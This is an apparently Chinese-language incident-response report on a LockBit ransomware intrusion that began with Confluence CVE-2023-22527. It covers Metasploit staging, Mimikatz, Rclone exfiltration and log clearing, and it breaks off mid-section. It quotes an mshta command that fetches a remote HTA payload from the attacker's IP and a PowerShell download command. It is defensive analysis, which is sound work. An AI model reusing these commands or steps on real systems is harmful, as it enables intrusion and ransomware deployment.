---
title: LockBit勒索软件案例
url: https://mp.weixin.qq.com/s?__biz=MzkzMDE3ODc1Mw==&mid=2247489169&idx=1&sn=a0cf0056a8b49c0e12f4f4c342e7cba5&chksm=c27f653ff508ec29aef806396f3acbbb1952d251f357d4c610d5379915eed2f75ac979e37c43&scene=58&subscene=0#rd
source: Desync InfoSec
date: 2025-03-03
fetch_date: 2025-10-06T21:56:59.106867
---

# LockBit勒索软件案例

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI466p2hOcEE8SSAiaoBWjTBXicqH3lA3twUh39yalaA7o9XF9NH7UlJ6hng/0?wx_fmt=jpeg)

# LockBit勒索软件案例

safest\_place

Desync InfoSec

## 关键要点

* • 攻击者最初利用CVE-2023-22527漏洞成功获取到部署在公网中的Confluence服务器权限，最终导致 LockBit 勒索软件在整个环境中部署。
* • 攻击者利用了各种工具，包括 Mimikatz、Metasploit 和 AnyDesk。
* • 攻击者利用 RDP 进行横向移动，通过多种方法部署 LockBit 勒索软件，包括通过 SMB 共享复制文件以进行远程执行和通过 PDQ Deploy 自动分发。
* • 敏感数据使用 Rclone 泄露，将文件传输到 MEGA.io 云存储。
* • 从边界突破到最终部署勒索软甲仅经过两个小时左右。

## 案例总结

攻击者利用CVE-2023-22527远程代码执行漏洞获取到部署在Windows服务器上的Confluence权限。尝试执行一系列命令，包括 net user 和 whoami。

不久之后，攻击者试图通过 curl 下载 AnyDesk，但尝试失败。然后，他们转向使用 mshta 下载包含 Metasploit载荷的远程 HTA 文件。在与 Metasploit C2服务器建立连接后，他们利用它成功下载并安装了 AnyDesk。安装后，AnyDesk 配置了预设密码，为攻击者提供持续的远程访问。

在 10 分钟内，攻击者使用 tasklist 收集进程列表，识别出几个感兴趣的进程，然后终止这些进程。我们评估这些进程属于先前的攻击者，通过杀死它们，攻击者确保了对服务器的独占控制权。值得注意的是，他们终止了 PowerShell，无意中杀死了自己的 Metasploit 进程😅。这迫使他们重新运行漏洞利用程序，以部署新的 Metasploit 载荷并重新建立C2连接。重新获得访问权限后，他们创建了一个新的本地帐户，并将其添加到 Administrators 组。

随后他们使用新创建的用户通过RDP登录到失陷主机上，然后执行了 Mimikatz。接下来，他们利用 SoftPerfect 的 NetScan 扫描整个网络中的存活主机。利用这些信息，他们定位到了备份服务器，并使用默认管理员账户RDP到了该服务器上。

在备份服务器上，攻击者执行了 PowerShell 脚本 Veeam-Get-Creds-New.ps1 来提取 Veeam 凭据。然后，他们通过 RDP 横向移动到文件共享服务器。他们部署了 Rclone 来将数据外发到 MEGA.io。之后，他们清除了文件服务器上的所有 Windows 事件日志。

然后，攻击者使用域管理员凭据通过 RDP 横向移动到域控服务器。进入域控服务器后，他们枚举了域管理员组成员身份。同时，他们返回备份服务器查看其配置。

不久之后，攻击者在整个环境中部署了 LockBit 勒索软件。他们首先通过其活动的 RDP 会话在备份服务器和文件共享服务器上手动执行勒索软件。为了确保加密在整个域范围生效，他们回到最初失陷的主机，在那里他们利用合法的企业部署工具 PDQ Deploy 在网络的其余部分自动分发勒索软件。

使用 PDQ Deploy，攻击者通过 SMB 将勒索软件二进制文件和批处理脚本分发到远程主机。然后，他们通过 PDQ 远程执行脚本，触发了跨多个系统的勒索软件部署。接下来，他们转向了 Exchange 服务器。

在 Exchange 服务器上，攻击者使用 net stop 和 taskkill 停止了关键服务。然后，他们将勒索软件二进制文件与新的批处理脚本一起部署，该脚本在执行时会启动勒索软件加密。此脚本旨在挂载远程系统的 C$ 共享，从而有效地执行二次加密，这是一种故障保护机制，以防 PDQ Deploy 错过任何目标。

勒索软件 （TTR） 的时间刚刚超过 2 小时 （02:06:14），使其成为一次极其快速的入侵。

# 入侵路径分析

## 边界突破

2024 年 2 月初，我们处理了一起由边界Windows服务器漏洞引发的入侵事件。该服务器存在 2024 年 1 月 16 日披露的 Confluence 远程代码执行 （RCE） 漏洞。

![](https://mmbiz.qpic.cn/mmbiz_jpg/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI46YcwkeEdkyYLZxhHqGyg3iaAofWO5tOWFlibcy33HLelib0moTLfn6Fjmw/640?wx_fmt=jpeg&from=appmsg "null")

### Confluence 远程代码执行漏洞利用

攻击者最初通过利用暴露的 Atlassian Confluence 服务器中的服务器端模板注入漏洞（CVE-2023-22527、CVSS 10.0）获得访问权限。此漏洞允许未经身份验证的攻击者通过注入 OGNL 表达式在目标服务器上执行任意命令。攻击者的IP为92[.]51.2.22，如以下 Suricata 警报所示。

![](https://mmbiz.qpic.cn/mmbiz_png/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI46UOSHeCEKnwezBicRZ34vt3ofzuCLzDWCpcEwqDBT5zIMhIZtCp8lZLA/640?wx_fmt=png&from=appmsg "null")

攻击者执行的第一个命令是 net user 和 whoami。这些用于枚举受感染的 Windows 服务器上的用户帐户，并收集有关当前受影响用户的信息。此外，从UA上推测，该漏洞可能是通过Python脚本进行攻击利用的。

![](https://mmbiz.qpic.cn/mmbiz_png/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI46WTWicT1oKVu8BQjgRmKR0IVjyGrPrYVgbOrXeeV0fvOmRGFLuzrEfuw/640?wx_fmt=png&from=appmsg "null")

![](https://mmbiz.qpic.cn/mmbiz_png/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI46SqYK4ViaZ2jZ5ZUepcPXVu0Q71DkCZia9Kzr8KcE2icoq1E0K9fpauufw/640?wx_fmt=png&from=appmsg "null")

该漏洞是由于未正确处理 Confluence 中某些模板文件中用户提供的输入而引起的。具体来说，像 confluence/template/xhtml/pagelist.vm 这样的文件接受传递给潜在危险函数的参数，而没有进行足够的清理。例如，可以纵 $stack.findValue 函数以注入恶意对象图导航语言 （OGNL） 表达式，从而导致任意代码执行。攻击者可以通过向特定端点（例如 /template/aui/text-inline.vm）发送精心编制的 HTTP POST 请求来利用此漏洞，并在参数中包含恶意负载。有关漏洞的其他详细信息，请参阅以下报告：Trend Micro 和 Splunk。

## 载荷执行

在运行初始发现命令后，攻击者试图使用漏洞利用从他们的服务器下载 AnyDesk 安装程序。

![](https://mmbiz.qpic.cn/mmbiz_png/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI46lvYCTE3S8ia5qS0iaLx6DgpgJzCyaD6EJdOgvDYFiaRTXib13oBRAEQaAQ/640?wx_fmt=png&from=appmsg "null")

但是，执行 curl 无法下载 AnyDesk 安装程序。这并没有阻止后来通过其他方式成功下载 AnyDesk 安装程序的攻击者。

### Meterpreter

在获得初始访问权限大约 10 分钟后，攻击者利用本机 Windows mshta.exe 实用程序下载并执行 Metasploit 阶段载荷。

```
mshta http://92.51.2[.]22:443/UsySLX1n.hta
```

正如 lolbas 项目中所概述的，这种技术使攻击者能够将有效负载放入 INetCache 目录并直接从该目录中执行，从而利用受信任的系统实用程序来逃避检测。

![](https://mmbiz.qpic.cn/mmbiz_png/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI46PFJJml4K77Pdp9OoqVUFQRPcwx5jGg4IlWLwfHV8bYmlfxsqAjUd9Q/640?wx_fmt=png&from=appmsg "null")

HTA 文件执行编码的 PowerShell 命令。

![](https://mmbiz.qpic.cn/mmbiz_png/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI46nYT5bm8ls4aIXiaK30Sgjyicghic4WXiaR2sbPiaeMT05sofsEW8VfqglMw/640?wx_fmt=png&from=appmsg "null")

HTA 文件的内容：

![](https://mmbiz.qpic.cn/mmbiz_png/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI46ddDDxpjuGgEZUlkDb2YmGtqibh1sk4enN709Dk2O5MicIN6oia4As2z2w/640?wx_fmt=png&from=appmsg "null")

此编码命令会生成另一个具有模糊处理命令行的 PowerShell 进程。

![](https://mmbiz.qpic.cn/mmbiz_png/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI46YFp0qb2iba5qhal8ia2Nodoo4nExibAVsgQpiaM6RuEMlUcPrlP38dlS7A/640?wx_fmt=png&from=appmsg "null")

要对命令行进行反混淆处理，必须：

* • 删除连接字符串的 + 符号。
* • 将 {0}、{1} 和 {2} 分别替换为 =、6 和 P。
* • Base64 解码生成的字符串。
* • Gzip 解压 base64 解码后的字符串。

结果是以下 PS 脚本，该脚本执行以下作：

1. 1. 获取指向特定 Windows API 函数的指针：VirtualAlloc()、VirtualProtect()、CreateThread() 和 WaitForSingleObject()。
2. 2. 通过 VirtualAlloc() 分配具有 PAGE\_EXECUTE\_READWRITE （0x40） 权限的新内存区域。
3. 3. 将 base64 解码的 Metasploit shellcode 复制到新分配的内存区域中。
4. 4. 将新内存区域的保护更改为 PAGE\_EXECUTE （0x10）。
5. 5. 创建一个指向新内存区域开头的新线程，以执行 Metasploit shellcode。
6. 6. 等待 shellcode 执行结束。

![](https://mmbiz.qpic.cn/mmbiz_png/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI46LOTlW93ibg8kQMbh6ZvdolCTETicDLxiaPGYkicetDFiaq2PtJYBm5Z8a0Q/640?wx_fmt=png&from=appmsg "null")

Metasploit shellcode 可以通过 speakeasy 模拟来识别命令和控制服务器。

![](https://mmbiz.qpic.cn/mmbiz_png/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI46oR1BGIaKaibCAFXftbpoEtaTLKTGibpzYJvK2zXpBzibhUAVZoQk7fKqA/640?wx_fmt=png&from=appmsg "null")

## 权限维持

攻击者通过powershell命令下载安装AnyDesk，在安装的同时会创建系统服务，确保AnyDesk跟随开机启动。

```
powershell -c (New-Object Net.WebClient).DownloadFile('http://download.anydesk.com/AnyDesk.msi', 'AnyDesk.msi')
```

Windows 系统事件 7045 显示服务创建。详细信息显示将启动 AnyDeskMSI.exe，并且启动类型设置为 auto，因此它将在服务器重启后运行。

![](https://mmbiz.qpic.cn/mmbiz_png/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI46MOHavpliahQicbEyDVNa8GU54L5AmtHdslIf375h5WU2os3HMQxzhV8Q/640?wx_fmt=png&from=appmsg "null")

攻击者使用了两个有效账户，并在最初的失陷主机主机上创建了一个新账户。用户 “backup” 已创建，给定密码，并添加到本地 “Administrator” 组。Sysmon 事件代码 1 显示了为执行活动而运行的命令：

![](https://mmbiz.qpic.cn/mmbiz_png/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI46hGXfoNJflQSosDCasFoQ07Sr17dAwRgo2ffp4HJz5UMfLZhuibicekcg/640?wx_fmt=png&from=appmsg "null")

Windows 安全事件 4720“已创建用户帐户”和 4732“已将成员添加到启用安全的本地组”显示创建用户，然后将用户添加到管理员组。由于用户名未显示在 4732 事件中。确保比较唯一的安全标识符 （SID）：

![](https://mmbiz.qpic.cn/mmbiz_png/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI46gJRTicqzrF3ichibwrnjWH3icNJINaJULh5cO59ibfu8AvCeqxJ0ySnjJSw/640?wx_fmt=png&from=appmsg "null")

![](https://mmbiz.qpic.cn/mmbiz_png/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI46ZYy6uhC9icuR7icHCcXP8sVicQfRxW6WIaGM6tn94Sjg4aJfyxtII8Yicw/640?wx_fmt=png&from=appmsg "null")

## 权限提升

Confluence服务本身以SYSTEM权限运行，因此攻击者直接获得了最初的失陷主机的最高权限。这用于创建名为 'backup' 的本地管理员用户。借助“backup”用户，攻击者能够通过其 Metasploit 有效载荷通过代理连接 RDP 到最初的失陷主机并执行 mimikatz。mimikatz 执行导致最初的失陷主机上的“管理员”账户的易破解哈希值被泄露。遗憾的是，此密码在环境中的主机之间重复使用。利用文件服务器上的“管理员”帐户，攻击者能够找到其他特权帐户帐户的明文凭据（请参阅“凭据访问”）。

## 防御规避

通过他们在最初的失陷主机的RDP会话，攻击者在开始菜单搜索中输入了'病毒'，以导航到'病毒和威胁防护'设置，以确保Windows Defender完全关闭。

![](https://mmbiz.qpic.cn/mmbiz_png/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI46rYPrDGSfI7iceVPdVq96vcmzlKCQEhezEJxwRvahWM566zhKCYsEqjQ/640?wx_fmt=png&from=appmsg "null")

通过 Rclone 从文件服务器中泄露数据后，Windows 事件日志通过 PowerShell 清除：

![](https://mmbiz.qpic.cn/mmbiz_png/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI46KjIGP5ScoY9EA9VrialADHhfBSTBs5Yu9lx2ybMeZyMibbOZuic9xpvFQ/640?wx_fmt=png&from=appmsg "null")

使用的 wevtutil 开关：

el | enum-logs 列出日志名称
cl | clear-log 清除日志

攻击者还删除了他们带入环境的文件：

![](https://mmbiz.qpic.cn/mmbiz_png/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI46p9TCSaicpqeModg0Sj1pHAiaficyjU08UFucgeWtqtldXhFibm82B3MSgg/640?wx_fmt=png&from=appmsg "null")

## 凭证访问

Mimikatz 在执行初始访问后仅 20 分钟就在最初失陷的主机上被执行。当 Anydesk 将文件写入磁盘时，这在主机上的内存中可以看到。

![](https://mmbiz.qpic.cn/mmbiz_png/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI46qFAvkmdrpfb3Fe5kVDr5mBkqYlHk45aZdGU9qjCQ2NE5Sg5d25iaQkw/640?wx_fmt=png&from=appmsg "null")

![](https://mmbiz.qpic.cn/mmbiz_png/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI46Xe335tafxkUgLOULUAibplK3icicnTuFttmCGBqs3tyotxVv9bg4HHTnw/640?wx_fmt=png&from=appmsg "null")

Sysmon 事件代码 1 显示了 Mimikatz 的执行：

![](https://mmbiz.qpic.cn/mmbiz_png/9DhkvTR0FkfgXHdPCiaicyzuUQyibbOMI46NrRfkUzZ06BEnj9Esd9G19A...